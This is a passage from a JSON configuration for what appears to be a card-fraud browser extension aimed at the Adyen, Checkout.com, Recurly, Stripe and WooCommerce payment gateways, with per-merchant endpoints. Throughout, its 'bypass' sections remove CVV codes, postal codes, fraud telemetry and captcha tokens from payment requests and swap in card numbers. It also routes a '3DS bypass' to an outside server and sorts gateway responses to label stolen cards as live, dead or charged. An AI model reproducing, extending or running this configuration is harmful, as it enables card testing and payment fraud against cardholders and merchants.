                                        "domains": [
                                            "app.mysteriumvpn.com"
                                        ],
                                        "endpointPatterns": [
                                            "/api/v1/subscription/adyen"
                                        ],
                                        "skipPatterns": []
                                    },
                                    {
                                        "id": "jetbrains",
                                        "domains": [
                                            "account.jetbrains.com",
                                            "www.jetbrains.com"
                                        ],
                                        "endpointPatterns": [
                                            "/cards/verify",
                                            "/shop/checkout"
                                        ],
                                        "skipPatterns": []
                                    },
                                    {
                                        "id": "imusician",
                                        "domains": [
                                            "connect.imusician.pro"
                                        ],
                                        "endpointPatterns": [
                                            "/invoices/",
                                            "/payment"
                                        ],
                                        "skipPatterns": []
                                    },
                                    {
                                        "id": "hotstar",
                                        "domains": [
                                            "www.hotstar.com",
                                            "hotstar.com"
                                        ],
                                        "endpointPatterns": [
                                            "/payment/initiate",
                                            "/gringotts/"
                                        ],
                                        "skipPatterns": [
                                            "/config",
                                            "/user/",
                                            "/content/",
                                            "/search/",
                                            "/watchlist"
                                        ]
                                    },
                                    {
                                        "id": "kieAi",
                                        "domains": [
                                            "api.kie.ai"
                                        ],
                                        "endpointPatterns": [
                                            "/client/trade/adyen/"
                                        ],
                                        "skipPatterns": [
                                            "/config",
                                            "/user/",
                                            "/account/"
                                        ]
                                    }
                                ]
                            },
                            "bypass": {
                                "action": "REMOVE_FROM_JSON",
                                "gateway": "adyen",
                                "encoding": "json",
                                "bypassEndpoints": [
                                    "/payments",
                                    "/v1/payments",
                                    "/v2/payments",
                                    "/payment",
                                    "/payments/adyen",
                                    "/payment/adyen",
                                    "/v1/checkout",
                                    "/api/v2/payments/adyen",
                                    "/checkout",
                                    "/details",
                                    "/api/v1/subscription/adyen",
                                    "/en/payment/",
                                    "/fr/payment/",
                                    "/de/payment/",
                                    "/es/payment/",
                                    "/it/payment/",
                                    "/pt/payment/",
                                    "/transformer/api/v1/payments",
                                    "/api/v1/subscription/adyen",
                                    "/cards/verify",
                                    "/invoices/",
                                    "/client/trade/adyen/"
                                ],
                                "bypassTypes": [
                                    "CVV"
                                ],
                                "params": [
                                    "encryptedSecurityCode",
                                    "encrypted_security_code"
                                ],
                                "regexRemovals": [
                                    "\"cvc\":\\s*\"[^\"]*\",?",
                                    "\"cvv\":\\s*\"[^\"]*\",?"
                                ],
                                "cardReplacementParams": {
                                    "number": [
                                        "encryptedCardNumber"
                                    ],
                                    "exp_month": [
                                        "encryptedExpiryMonth"
                                    ],
                                    "exp_year": [
                                        "encryptedExpiryYear"
                                    ],
                                    "cvc": [
                                        "encryptedSecurityCode"
                                    ]
                                },
                                "cvvKeys": [
                                    "encryptedSecurityCode",
                                    "encryptedsecuritycode",
                                    "encrypted_security_code"
                                ]
                            },
                            "cardReplacementParams": {
                                "number": [
                                    "encryptedCardNumber"
                                ],
                                "exp_month": [
                                    "encryptedExpiryMonth"
                                ],
                                "exp_year": [
                                    "encryptedExpiryYear"
                                ],
                                "cvc": [
                                    "encryptedSecurityCode"
                                ]
                            },
                            "nestedPayloads": {
                                "_comment": "Some third-party sites wrap Adyen JSON inside a URL-encoded parameter. Client must: 1) parse URL-encoded body, 2) extract the named param, 3) URL-decode + JSON.parse it, 4) apply bypass/card replacement on the nested JSON, 5) JSON.stringify + URL-encode back, 6) reassemble the URL-encoded body.",
                                "instantGaming": {
                                    "domainMatch": "instant-gaming.com",
                                    "bodyEncoding": "urlencoded",
                                    "nestedParam": "pi",
                                    "nestedEncoding": "json",
                                    "targetPath": "paymentMethod",
                                    "cvvField": "encryptedSecurityCode",
                                    "cardFields": {
                                        "number": "encryptedCardNumber",
                                        "exp_month": "encryptedExpiryMonth",
                                        "exp_year": "encryptedExpiryYear",
                                        "cvc": "encryptedSecurityCode"
                                    }
                                },
                                "jetbrains": {
                                    "domainMatch": "jetbrains.com",
                                    "bodyEncoding": "multipart",
                                    "nestedParam": "adyen_payment_data",
                                    "nestedEncoding": "json",
                                    "targetPath": "",
                                    "cvvField": "encryptedSecurityCode",
                                    "cardFields": {
                                        "number": "encryptedCardNumber",
                                        "exp_month": "encryptedExpiryMonth",
                                        "exp_year": "encryptedExpiryYear",
                                        "cvc": "encryptedSecurityCode"
                                    },
                                    "_note": "JetBrains wraps Adyen JSON in adyen_payment_data URL param. targetPath empty = fields at root level of JSON (not nested under paymentMethod)."
                                }
                            },
                            "tracking": {
                                "domains": [
                                    "adyen.com",
                                    "checkoutshopper-live.adyen.com",
                                    "checkoutshopper-test.adyen.com"
                                ],
                                "excludePatterns": [
                                    "binlookup",
                                    "setup",
                                    "analytics",
                                    "log",
                                    "fingerprint",
                                    "telemetry",
                                    "checkoutanalytics",
                                    "checkout.com",
                                    "google.com",
                                    "doubleclick.net",
                                    "facebook.com",
                                    "tiktok.com"
                                ],
                                "endpoints": [
                                    "/payments",
                                    "/payment",
                                    "/payments/adyen",
                                    "/payment/adyen",
                                    "/v1/checkout",
                                    "/api/v2/payments/adyen",
                                    "/en/payment/",
                                    "/fr/payment/",
                                    "/de/payment/",
                                    "/es/payment/",
                                    "/it/payment/",
                                    "/pt/payment/",
                                    "/transformer/api/v1/payments",
                                    "/api/v1/subscription/adyen",
                                    "/paymentDetails",
                                    "/cards/verify",
                                    "/invoices/",
                                    "/client/trade/adyen/"
                                ],
                                "endpointPatterns": [],
                                "success": {
                                    "statuses": [
                                        "Authorised",
                                        "received",
                                        "RedirectShopper",
                                        "redirected",
                                        "COMPLETED_SUCCESSFULLY",
                                        "ACCEPTED",
                                        "OK"
                                    ],
                                    "_comment": "OK = JetBrains custom success response ({status:'OK',code:'...'}). Standard Adyen uses resultCode (not status field), so OK only triggers on JetBrains /cards/verify endpoint. No false positive risk for standard Adyen sites."
                                },
                                "ccnLive": {
                                    "codes": [
                                        "Not enough balance",
                                        "CVC Declined",
                                        "13",
                                        "24",
                                        "PAY-001"
                                    ],
                                    "messages": [
                                        "not enough balance",
                                        "cvc declined"
                                    ],
                                    "_comment": "Adyen refusalReasonCode 13 = Not enough balance (card live, no funds), 24 = CVC Declined (card live, wrong CVC). PAY-001 = Hotstar 'Not enough balance'. Numeric codes as strings for declineCodePaths matching."
                                },
                                "dead": {
                                    "codes": [
                                        "Blocked Card",
                                        "Expired Card",
                                        "Invalid Card Number",
                                        "Acquirer Fraud",
                                        "FRAUD",
                                        "FRAUD-CANCELLED",
                                        "Restricted Card",
                                        "Issuer Suspected Fraud",
                                        "5",
                                        "6",
                                        "8",
                                        "14",
                                        "20",
                                        "22",
                                        "25",
                                        "31",
                                        "PAY-004",
                                        "PAY-008",
                                        "INVALID_PAYLOAD_CHARGE_REQUEST",
                                        "FAILURE_AT_PAYMENT_GATEWAY_END"
                                    ],
                                    "messages": [
                                        "csrf_error",
                                        "payment_failed",
                                        "invalid card number",
                                        "fraud",
                                        "invalid payload"
                                    ],
                                    "statuses": [
                                        "Refused",
                                        "Cancelled",
                                        "Error",
                                        "REJECTED",
                                        "CANCELED",
                                        "UNKNOWN_FAILURE",
                                        "failed",
                                        "payment_failed"
                                    ],
                                    "_comment": "Includes expired cards (code 6) as DEAD. Hotstar codes: PAY-004=Invalid Card, PAY-008=FRAUD, INVALID_PAYLOAD_CHARGE_REQUEST=CVV patched/empty payload, FAILURE_AT_PAYMENT_GATEWAY_END=gateway error."
                                },
                                "expired": {
                                    "cardCodes": [],
                                    "sessionCodes": [],
                                    "statuses": [
                                        "EXPIRED",
                                        "UNFINISHED_PAYMENTS"
                                    ],
                                    "_comment": "Session/invoice expired — NOT card expired. Card expired = DEAD (refusalReasonCode 6)"
                                },
                                "subscription": {
                                    "codes": [],
                                    "messages": []
                                },
                                "messageOverrides": {
                                    "charged": {
                                        "redirected": "Your order is complete"
                                    },
                                    "dead": {
                                        "failed": "Declined by bank",
                                        "INVALID_PAYLOAD_CHARGE_REQUEST": "cvc_required (CVV bypass patched)",
                                        "FAILURE_AT_PAYMENT_GATEWAY_END": "Gateway Error"
                                    }
                                },
                                "responsePaths": {
                                    "status": [
                                        "resultCode",
                                        "data.resultCode",
                                        "data.data.resultCode",
                                        "orderStatus",
                                        "aggregatedPaymentStatus",
                                        "type",
                                        "status",
                                        "item.status",
                                        "responseCode"
                                    ],
                                    "error": [
                                        "refusalReason",
                                        "errorCode",
                                        "description.responseCode"
                                    ],
                                    "declineCode": [
                                        "refusalReason",
                                        "refusalReasonCode",
                                        "data.refusalReason",
                                        "data.refusalReasonCode",
                                        "data.data.refusalReason",
                                        "data.data.refusalReasonCode",
                                        "errorCode",
                                        "responseCode",
                                        "description.responseCode"
                                    ],
                                    "declineReason": [
                                        "refusalReason",
                                        "data.refusalReason",
                                        "additionalData.refusalReasonRaw",
                                        "message"
                                    ],
                                    "amount": [
                                        "amount.value",
                                        "data.amount.value"
                                    ],
                                    "currency": [
                                        "amount.currency",
                                        "data.amount.currency"
                                    ]
                                },
                                "thirdPartyTracking": {
                                    "_comment": "Custom tracking logic for third-party sites using Adyen. Standard Adyen tracking (resultCode matching) works for most sites. GOG has custom response format.",
                                    "gog": {
                                        "customSuccess": {
                                            "type": "redirected",
                                            "redirectionType": "internal",
                                            "_note": "Only trigger on payment endpoints (/checkout, /payment, /order), NOT on generic redirects. Also accept if response has orderStatus/aggregatedPaymentStatus/paymentId."
                                        },
                                        "customFailure": {
                                            "type": "failed"
                                        },
                                        "domainFilter": "gog.com",
                                        "skipEndpoints": [
                                            "/properties/",
                                            "/tokenize",
                                            "/users/",
                                            "/account/",
                                            "/stats"
                                        ]
                                    }
                                }
                            },
                            "skipPatterns": [
                                "/analytics",
                                "/sessions/setup",
                                "/checkoutanalytics",
                                "/purchased-products",
                                "/recommendations",
                                "/wishlist",
                                "/properties/",
                                "/tokenize",
                                "/overview"
                            ]
                        },
                        "checkout": {
                            "id": "checkout",
                            "displayName": "Checkout.com",
                            "mode": "production",
                            "detection": {
                                "domains": [
                                    "api.checkout.com",
                                    "card-acquisition-gateway.checkout.com",
                                    "authentication-devices.checkout.com"
                                ],
                                "endpointPatterns": [],
                                "excludePatterns": [
                                    "/frames/callback",
                                    "/cdn/frames",
                                    "/cdn-cgi/"
                                ],
                                "priority": 4
                            },
                            "bypass": {
                                "action": "REMOVE_FROM_JSON",
                                "gateway": "checkout",
                                "encoding": "json",
                                "bypassEndpoints": [
                                    "/tokens"
                                ],
                                "bypassTypes": [
                                    "CVV"
                                ],
                                "params": [
                                    "cvv"
                                ],
                                "regexRemovals": [
                                    "\"cvc\":\\s*\"[^\"]*\",?",
                                    "\"cvv\":\\s*\"[^\"]*\",?"
                                ],
                                "cardReplacementParams": {
                                    "number": [
                                        "number"
                                    ],
                                    "exp_month": [
                                        "expiry_month"
                                    ],
                                    "exp_year": [
                                        "expiry_year"
                                    ],
                                    "cvc": [
                                        "cvv"
                                    ]
                                }
                            },
                            "cardReplacementParams": {
                                "number": [
                                    "number"
                                ],
                                "exp_month": [
                                    "expiry_month"
                                ],
                                "exp_year": [
                                    "expiry_year"
                                ],
                                "cvc": [
                                    "cvv"
                                ]
                            },
                            "tracking": {
                                "domains": [
                                    "api.checkout.com",
                                    "card-acquisition-gateway.checkout.com",
                                    "authentication-devices.checkout.com"
                                ],
                                "excludePatterns": [
                                    "/frames/callback",
                                    "/cdn/frames",
                                    "/cdn-cgi/"
                                ],
                                "endpoints": [
                                    "/tokens",
                                    "/payment-sessions/",
                                    "/submit",
                                    "/3ds/",
                                    "/device-information"
                                ],
                                "endpointPatterns": [],
                                "success": {
                                    "statuses": [
                                        "Authorized",
                                        "Captured",
                                        "Card Verified",
                                        "Paid"
                                    ],
                                    "_statuses_source": "Official docs: status field values for successful payments. 'Approved' removed — that's response_summary, not status field. matchGroup Step 2 checks responsePaths.status paths.",
                                    "htmlPatterns": [
                                        "RedirectReason: 'success'"
                                    ],
                                    "urlPatterns": [
                                        "confirmation?"
                                    ]
                                },
                                "ccnLive": {
                                    "codes": [
                                        "not_enough_funds",
                                        "20051",
                                        "200N7"
                                    ],
                                    "_codes_source": {
                                        "20051": "Official docs — response_code for 'Insufficient Funds' (soft decline, card valid)",
                                        "not_enough_funds": "PHP ref proven — decline_reason field value",
                                        "200N7": "Official docs — response_code for 'Decline for CVV2 failure' (card valid, CVV wrong)"
                                    },
                                    "messages": [
                                        "insufficient funds"
                                    ],
                                    "_messages_source": "Official docs response example: response_summary = 'Insufficient Funds'. Fallback text match via matchGroup Step 4. Per-gateway isolated — no cross-gateway false positive.",
                                    "htmlPatterns": [
                                        "3DS2 Challenge",
                                        "3DS Challenge"
                                    ]
                                },
                                "dead": {
                                    "statuses": [
                                        "Declined"
                                    ],
                                    "_statuses_source": "Official docs: status field = 'Declined' on authorization failure. Moved from codes[] — 'Declined' is a status value, not a decline code. matchGroup Step 2 matches via responsePaths.status.",
                                    "codes": [
                                        "invalid_customer_data",
                                        "card_number_invalid",
                                        "20005",
                                        "20054",
                                        "30033"
                                    ],
                                    "_codes_source": {
                                        "20005": "Official docs — 'Declined - Do not honour' (most common bank decline)",
                                        "20054": "Official docs — 'Expired card' (card expired = dead, consistent with Adyen config)",
                                        "30033": "Official docs — 'Expired card - Pick up' (hard decline)",
                                        "invalid_customer_data": "PHP ref — email/card/IP banned by merchant",
                                        "card_number_invalid": "PHP ref — invalid card number (tokenization stage)"
                                    },
                                    "messages": [],
                                    "htmlPatterns": [
                                        "RedirectReason: 'failure'",
                                        "RedirectReason: 'declined'"
                                    ],
                                    "urlPatterns": [
                                        "failure?"
                                    ]
                                },
                                "expired": {
                                    "cardCodes": [],
                                    "sessionCodes": [
                                        "payment_attempts_exceeded",
                                        "payment_session_paid"
                                    ],
                                    "_note": "payment_attempts_exceeded = invoice voided (PHP ref: session_expired: true). payment_session_paid = already paid by another card. Both should stop automation loop.",
                                    "_sessionCodes_source": {
                                        "payment_attempts_exceeded": "PHP ref — invoice voided, no more cards can be checked. Moved from dead.codes.",
                                        "payment_session_paid": "PHP ref — invoice already paid. Moved from dead.codes."
                                    }
                                },
                                "subscription": {
                                    "codes": [],
                                    "messages": []
                                },
                                "messageOverrides": {},
                                "responsePaths": {
                                    "status": [
                                        "status",
                                        "response_summary"
                                    ],
                                    "error": [
                                        "decline_reason",
                                        "error_codes"
                                    ],
                                    "declineCode": [
                                        "response_code",
                                        "decline_reason",
                                        "error_codes[0]"
                                    ],
                                    "declineReason": [
                                        "response_summary",
                                        "decline_reason"
                                    ],
                                    "amount": [
                                        "amount"
                                    ],
                                    "currency": [
                                        "currency"
                                    ],
                                    "customerEmail": [
                                        "customer.email"
                                    ]
                                },
                                "trackingGetEndpoints": [
                                    "/3ds/",
                                    "/device-information"
                                ],
                                "htmlParsing": {
                                    "_comment": "Config-driven redirect URL extraction for 3DS HTML responses. Used by status-tracker.js extractRedirectUrl(). Source: PHP ref paycheckout_api.php + Python ref docomo.py.",
                                    "redirectReasonPattern": "RedirectReason: '",
                                    "redirectReasonEnd": "'",
                                    "redirectUrlPattern": "window.top.location.replace('",
                                    "redirectUrlEnd": "')"
                                }
                            },
                            "skipPatterns": [
                                "/frames/callback",
                                "/cdn/frames"
                            ]
                        },
                        "recurly": {
                            "id": "recurly",
                            "displayName": "Recurly",
                            "mode": "production",
                            "detection": {
                                "domains": [
                                    "api.recurly.com"
                                ],
                                "endpointPatterns": [],
                                "excludePatterns": [
                                    "/js/v1/co_badge"
                                ],
                                "priority": 5,
                                "thirdPartySites": [{
                                    "id": "vyprvpn",
                                    "domains": [
                                        "vyprvpn.com"
                                    ],
                                    "endpointPatterns": [
                                        "/api/",
                                        "/create-subscription",
                                        "/recurly/set-billing-info"
                                    ],
                                    "skipPatterns": []
                                }]
                            },
                            "bypass": {
                                "action": "BLANK_IN_URLENCODED",
                                "gateway": "recurly",
                                "encoding": "form-urlencoded",
                                "bypassEndpoints": [
                                    "/js/v1/token"
                                ],
                                "bypassTypes": [
                                    "CVV"
                                ],
                                "params": [
                                    "cvv"
                                ],
                                "regexRemovals": [
                                    "\"cvc\":\\s*\"[^\"]*\",?",
                                    "\"cvv\":\\s*\"[^\"]*\",?"
                                ],
                                "cardReplacementParams": {
                                    "number": [
                                        "number"
                                    ],
                                    "exp_month": [
                                        "month"
                                    ],
                                    "exp_year": [
                                        "year"
                                    ],
                                    "cvc": [
                                        "cvv"
                                    ]
                                }
                            },
                            "cardReplacementParams": {
                                "number": [
                                    "number"
                                ],
                                "exp_month": [
                                    "month"
                                ],
                                "exp_year": [
                                    "year"
                                ],
                                "cvc": [
                                    "cvv"
                                ]
                            },
                            "tracking": {
                                "domains": [
                                    "api.recurly.com"
                                ],
                                "excludePatterns": [
                                    "/js/v1/co_badge"
                                ],
                                "endpoints": [
                                    "/js/v1/token",
                                    "/api/",
                                    "/create-subscription",
                                    "/recurly/set-billing-info"
                                ],
                                "endpointPatterns": [],
                                "success": {
                                    "statuses": [],
                                    "messages": [],
                                    "_comment": "Recurly success detection is HTTP-status-based (200/201 + no error field). matchGroup cannot check HTTP status — success detection deferred until HTTP status support added. Third-party sites may have their own success patterns to add after manual testing."
                                },
                                "ccnLive": {
                                    "codes": [],
                                    "messages": [
                                        "insufficient funds",
                                        "insufficient_funds"
                                    ],
                                    "_comment": "Recurly official error codes include insufficient_funds. Added as message fallback — if any Recurly-powered site returns this text in response, it will match via matchGroup Step 4 stringify search."
                                },
                                "dead": {
                                    "codes": [],
                                    "messages": [
                                        "declined",
                                        "not valid",
                                        "refused",
                                        "invalid card",
                                        "expired card",
                                        "card number is not valid",
                                        "restricted card",
                                        "rate limit"
                                    ],
                                    "statuses": [],
                                    "_comment": "v2.4.9 used typePatterns + titlePatterns. Converted to messages[] for matchGroup Step 4 compatibility — stringify search matches text anywhere in response body. Patterns from v2.4.9 session-rules + Recurly official transaction error codes."
                                },
                                "expired": {
                                    "cardCodes": [],
                                    "sessionCodes": []
                                },
                                "subscription": {
                                    "codes": [],
                                    "messages": []
                                },
                                "messageOverrides": {
                                    "dead": {
                                        "rate limit": "rate_limited"
                                    }
                                },
                                "responsePaths": {
                                    "status": [
                                        "type",
                                        "title"
                                    ],
                                    "error": [
                                        "type",
                                        "title",
                                        "message"
                                    ],
                                    "declineCode": [
                                        "code",
                                        "error_code",
                                        "type"
                                    ],
                                    "declineReason": [
                                        "title",
                                        "message"
                                    ]
                                }
                            },
                            "skipPatterns": []
                        },
                        "stripe": {
                            "id": "stripe",
                            "displayName": "Stripe",
                            "mode": "production",
                            "detection": {
                                "domains": [
                                    "api.stripe.com",
                                    "billing.stripe.com"
                                ],
                                "endpointPatterns": [],
                                "excludePatterns": [
                                    "r.stripe.com",
                                    "analytics",
                                    "telemetry",
                                    "logging"
                                ],
                                "priority": 1
                            },
                            "bypass": {
                                "action": "REMOVE_FROM_URLENCODED",
                                "gateway": "stripe",
                                "encoding": "form-urlencoded",
                                "bypassEndpoints": [
                                    "/payment_methods",
                                    "/tokens",
                                    "/sources",
                                    "/confirm",
                                    "/confirmation_tokens"
                                ],
                                "bypassTypes": [
                                    "CVV",
                                    "PAU",
                                    "SECURITY"
                                ],
                                "params": [
                                    "cvc",
                                    "cvv",
                                    "security_code",
                                    "cvv2",
                                    "cvc2",
                                    "card[cvc]",
                                    "card[cvv]",
                                    "payment_method_data[card][cvc]",
                                    "payment_method_options[card][cvc]",
                                    "link[card][cvc]",
                                    "source_data[card][cvc]",
                                    "source[card][cvc]",
                                    "billing_details[card][cvc]",
                                    "payment_method[card][cvc]",
                                    "setup_intent_data[card][cvc]",
                                    "token[card][cvc]",
                                    "payment_user_agent",
                                    "payment_method_data[payment_user_agent]",
                                    "source_data[payment_user_agent]",
                                    "pasted_fields",
                                    "payment_method_data[pasted_fields]",
                                    "source_data[pasted_fields]",
                                    "card[pasted_fields]",
                                    "billing_details[pasted_fields]",
                                    "time_on_page",
                                    "payment_method_data[time_on_page]",
                                    "source_data[time_on_page]",
                                    "muid",
                                    "sid",
                                    "guid",
                                    "payment_method_data[muid]",
                                    "payment_method_data[sid]",
                                    "payment_method_data[guid]",
                                    "payment_method_data[referrer]",
                                    "payment_method_data[client_attribution_metadata]",
                                    "client_attribution_metadata",
                                    "radar_options[hcaptcha_token]",
                                    "passive_captcha_token",
                                    "passive_captcha_ekey",
                                    "zip",
                                    "postal_code",
                                    "zip_code",
                                    "postal",
                                    "address_zip",
                                    "card[address_zip]",
                                    "card[postal_code]",
                                    "card[zip]",
                                    "billing_details[address][postal_code]",
                                    "billing_details[address][zip]",
                                    "billing_details[address][zip_code]",
                                    "payment_method_data[billing_details][address][postal_code]",
                                    "payment_method_data[billing_details][address][zip]",
                                    "owner[address][postal_code]",
                                    "owner[address][zip]",
                                    "source_data[owner][address][postal_code]",
                                    "address[postal_code]",
                                    "address[zip]",
                                    "address[zip_code]",
                                    "billing[postal_code]",
                                    "billing_address[postal_code]"
                                ],
                                "regexRemovals": [
                                    "\"cvc\":\\s*\"[^\"]*\",?",
                                    "\"cvv\":\\s*\"[^\"]*\",?"
                                ],
                                "cardReplacementParams": {
                                    "number": [
                                        "card[number]",
                                        "payment_method_data[card][number]",
                                        "source_data[card][number]",
                                        "source[card][number]"
                                    ],
                                    "exp_month": [
                                        "card[exp_month]",
                                        "payment_method_data[card][exp_month]",
                                        "source_data[card][exp_month]",
                                        "source[card][exp_month]"
                                    ],
                                    "exp_year": [
                                        "card[exp_year]",
                                        "payment_method_data[card][exp_year]",
                                        "source_data[card][exp_year]",
                                        "source[card][exp_year]"
                                    ],
                                    "cvc": [
                                        "card[cvc]",
                                        "card[cvv]",
                                        "payment_method_data[card][cvc]",
                                        "source_data[card][cvc]",
                                        "source[card][cvc]"
                                    ]
                                },
                                "threeDS": {
                                    "_comment": "Stripe 3DS Bypass — v2.5 server-side. Extension does host-replace, server handles all logic.",
                                    "endpoint": "/3ds2/authenticate",
                                    "enabled": true
                                },
                                "emailReplace": [
                                    "billing_details[email]",
                                    "payment_method_data[billing_details][email]",
                                    "receipt_email",
                                    "owner[email]",
                                    "source_data[owner][email]"
                                ]
                            },
                            "cardReplacementParams": {
                                "number": [
                                    "card[number]",
                                    "payment_method_data[card][number]",
                                    "source_data[card][number]",
                                    "source[card][number]"
                                ],
                                "exp_month": [
                                    "card[exp_month]",
                                    "payment_method_data[card][exp_month]",
                                    "source_data[card][exp_month]",
                                    "source[card][exp_month]"
                                ],
                                "exp_year": [
                                    "card[exp_year]",
                                    "payment_method_data[card][exp_year]",
                                    "source_data[card][exp_year]",
                                    "source[card][exp_year]"
                                ],
                                "cvc": [
                                    "card[cvc]",
                                    "card[cvv]",
                                    "payment_method_data[card][cvc]",
                                    "source_data[card][cvc]",
                                    "source[card][cvc]"
                                ]
                            },
                            "tracking": {
                                "domains": [
                                    "api.stripe.com",
                                    "billing.stripe.com"
                                ],
                                "excludePatterns": [
                                    "r.stripe.com",
                                    "analytics",
                                    "telemetry",
                                    "logging"
                                ],
                                "endpoints": [
                                    "/verify_challenge",
                                    "/payment_intents/",
                                    "/payment_methods",
                                    "/tokens",
                                    "/confirm",
                                    "/setup_intents/",
                                    "/billing_portal/",
                                    "/completed_webhook_delivered",
                                    "/3ds2/authenticate"
                                ],
                                "endpointPatterns": [],
                                "success": {
                                    "statuses": [
                                        "succeeded",
                                        "requires_capture"
                                    ],
                                    "skipStatuses": [
                                        "requires_action",
                                        "requires_source_action",
                                        "authentication_required"
                                    ]
                                },
                                "ccnLive": {
                                    "codes": [
                                        "insufficient_funds",
                                        "incorrect_cvc",
                                        "invalid_cvc",
                                        "transaction_not_allowed"
                                    ],
                                    "messages": [
                                        "insufficient funds",
                                        "security code is invalid",
                                        "security code is incorrect",
                                        "incorrect security code",
                                        "invalid security code",
                                        "does not support this type of purchase",
                                        "previously used"
                                    ]
                                },
                                "dead": {
                                    "_comment": "No codes needed — generic fallback catches all error codes as DEAD. Messages needed for invalid_request_error custom detection (code-less errors).",
                                    "messages": [
                                        "invalid json",
                                        "collect the security code",
                                        "integration surface is unsupported",
                                        "required to use the stripe sdk",
                                        "no valid challenge",
                                        "invalid postal code",
                                        "3d secure 2 is not supported"
                                    ]
                                },
                                "expired": {
                                    "sessionCodes": [
                                        "checkout_not_active_session",
                                        "checkout_session_expired",
                                        "payment_intent_unexpected_state"
                                    ],
                                    "sessionMessages": [
                                        "expired",
                                        "not active",
                                        "timed out",
                                        "timeout",
                                        "status of canceled"
                                    ]
                                },
                                "subscription": {
                                    "codes": [
                                        "checkout_has_active_subscriptions"
                                    ],
                                    "messages": [
                                        "already have a subscription",
                                        "manage your subscription"
                                    ]
                                },
                                "messageOverrides": {
                                    "_comment": "v2.4.9 parity: custom display messages for specific patterns (matched against declineCode or declineReason)",
                                    "dead": {
                                        "collect the security code": "cvc_required",
                                        "invalid json": "3ds_bypass_failed",
                                        "3d secure 2 is not supported": "3ds_bypass_failed",
                                        "integration surface is unsupported": "ua_required",
                                        "required to use the stripe sdk": "ua_required",
                                        "no valid challenge": "hcaptcha_challenge_failed",
                                        "invalid postal code": "invalid_postal_code",
                                        "expired_card": "Card Expired",
                                        "invalid_expiry_month": "Card Expired",
                                        "invalid_expiry_year": "Card Expired"
                                    },
                                    "ccnLive": {
                                        "previously used": "duplicate_card"
                                    },
                                    "charged": {
                                        "_default": "Payment Successful"
                                    }
                                },
                                "responsePaths": {
                                    "status": [
                                        "payment_intent.status",
                                        "setup_intent.status",
                                        "status",
                                        "payment_status",
                                        "data.payment_intent.status",
                                        "data.setup_intent.status",
                                        "data.status"
                                    ],
                                    "error": [
                                        "error",
                                        "last_payment_error",
                                        "last_setup_error",
                                        "payment_intent.last_payment_error",
                                        "setup_intent.last_payment_error",
                                        "error.setup_intent.last_setup_error"
                                    ],
                                    "declineCode": [
                                        "error.decline_code",
                                        "error.code",
                                        "decline_code",
                                        "last_payment_error.decline_code",
                                        "last_payment_error.code",
                                        "last_setup_error.decline_code",
                                        "last_setup_error.code",
                                        "payment_intent.last_payment_error.decline_code",
                                        "setup_intent.last_setup_error.decline_code",
                                        "charges[0].outcome.decline_code",
                                        "charges[0].failure_code"
                                    ],
                                    "declineReason": [
                                        "error.message",
                                        "last_payment_error.message",
                                        "last_setup_error.message",
                                        "outcome.seller_message"
                                    ],
                                    "amount": [
                                        "amount",
                                        "payment_intent.amount",
                                        "amount_received"
                                    ],
                                    "currency": [
                                        "currency",
                                        "payment_intent.currency"
                                    ],
                                    "customerEmail": [
                                        "receipt_email",
                                        "customer_email",
                                        "billing_details.email",
                                        "payment_method.billing_details.email",
                                        "error.payment_method.billing_details.email",
                                        "error.payment_intent.receipt_email",
                                        "error.payment_intent.last_payment_error.payment_method.billing_details.email",
                                        "last_payment_error.payment_method.billing_details.email",
                                        "payment_intent.receipt_email",
                                        "payment_intent.last_payment_error.payment_method.billing_details.email",
                                        "charges.data.0.billing_details.email",
                                        "charges.data.0.receipt_email"
                                    ],
                                    "description": [
                                        "description",
                                        "payment_intent.description",
                                        "error.payment_intent.description",
                                        "charges.data.0.description"
                                    ]
                                },
                                "trackingGetEndpoints": [
                                    "/payment_intents/",
                                    "/setup_intents/"
                                ]
                            },
                            "skipPatterns": [
                                "consumers/sessions/lookup",
                                "consumers/accounts",
                                "payment_pages/ephemeral_keys",
                                "setup_intents/validate",
                                "address_element",
                                "customer_session",
                                "experiments/lookup"
                            ],
                            "threeDS": {
                                "_comment": "Stripe 3DS Bypass — v2.5 server-side. Extension does host-replace, server handles all logic.",
                                "endpoint": "/3ds2/authenticate",
                                "enabled": true
                            },
                            "checkoutDetection": {
                                "_comment": "Server-driven Stripe Checkout detection config (V2.5 anti-crack). Client reads these to detect Stripe Checkout /init responses on custom domains.",
                                "urlPatterns": [
                                    "/payment_pages/",
                                    "/init"
                                ],
                                "responseObjectType": "checkout.session",
                                "checkoutUrlFields": [
                                    "url",
                                    "stripe_hosted_url"
                                ],
                                "sessionInfoFields": {
                                    "sessionId": "session_id",
                                    "merchantName": [
                                        "account_settings.display_name",
                                        "account_settings.order_summary_display_name",
                                        "account_settings.merchant_of_record_display_name",
                                        "statement_descriptor"
                                    ],
                                    "mode": "mode",
                                    "currency": [
                                        "currency",
                                        "invoice.currency",
                                        "line_item_group.currency",
                                        "payment_intent.currency"
                                    ],
                                    "amount": [
                                        "total_summary.due",
                                        "invoice.amount_due",
                                        "invoice.total",
                                        "line_item_group.due",
                                        "payment_intent.amount"
                                    ],
                                    "email": [
                                        "customer_email",
                                        "customer.email",
                                        "payment_intent.receipt_email",
                                        "payment_intent.last_payment_error.payment_method.billing_details.email"
                                    ],
                                    "uiMode": "ui_mode",
                                    "businessUrl": "account_settings.business_url",
                                    "successUrl": [
                                        "success_url",
                                        "return_url"
                                    ],
                                    "cancelUrl": [
                                        "cancel_url"
                                    ],
                                    "productName": [
                                        "line_item_group.line_items.0.name",
                                        "line_item_group.line_items.0.price.product.name",
                                        "line_item_group.line_items.0.description",
                                        "invoice.lines.data.0.price.product.name",
                                        "invoice.lines.data.0.description"
                                    ]
                                }
                            },
                            "stripe3ds": {
                                "enabled": true,
                                "targetOrigin": "https://zawkz.io"
                            }
                        },
                        "woocommerce": {
                            "id": "woocommerce",
                            "displayName": "WooCommerce",
                            "mode": "production",
                            "detection": {
                                "domains": [],
                                "endpointPatterns": [
                                    "wc-ajax=checkout",
                                    "admin-ajax.php"
                                ],
                                "excludePatterns": [],
                                "priority": 10
                            },
                            "tracking": {
                                "domains": [],
                                "excludePatterns": [],
                                "endpoints": [
                                    "wc-ajax=checkout"
                                ],
                                "endpointPatterns": [],
                                "success": {
                                    "statuses": [],
                                    "messages": [
                                        "order-received"
                                    ],
                                    "_comment": "v2.4.9 logic: result==='success' && redirect.includes('order-received'). In v2.5 matchGroup Step 4, stringify search finds 'order-received' in the redirect URL field. This prevents false positive CHARGED on 3DS redirects where result='success' but redirect URL goes to 3DS provider (no 'order-received' in URL)."
                                },
                                "ccnLive": {
                                    "codes": [],
                                    "messages": [
